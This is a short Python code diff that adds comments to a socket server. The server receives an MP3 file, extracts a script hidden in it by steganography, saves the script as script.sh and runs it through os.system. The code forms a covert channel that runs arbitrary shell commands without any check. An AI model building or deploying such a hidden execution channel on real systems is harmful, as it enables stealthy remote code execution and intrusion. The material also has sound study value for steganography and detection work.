@@ -26,18 +26,18 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         conn, addr = sock.accept()
         with conn:
             print(f"Connected by {addr}")
-            mp3file_content = receive_file()
+            mp3file_content = receive_file()  # receive the mp3 file with the hidden script
 
         with open('file.mp3', 'wb') as mp3file:
             print('Saving mp3 file')
             mp3file.write(mp3file_content)
             s = Steganography(quiet=False)
-            s.reveal_massage('file.mp3', 'msg.txt')
+            s.reveal_massage('file.mp3', 'msg.txt')  # reveal the script to the msg.txt file
             with open('msg.txt', 'r') as msg:
                 script_content = msg.read()
                 print('Hidden script:', script_content)
                 print("#" * 20)
-                with open('script.sh', 'w') as script:
+                with open('script.sh', 'w') as script:  # save the script as a shell file
                     script.write(script_content)
 
-            os.system('sh script.sh')
+            os.system('sh script.sh')  # execute the hidden script on the server side
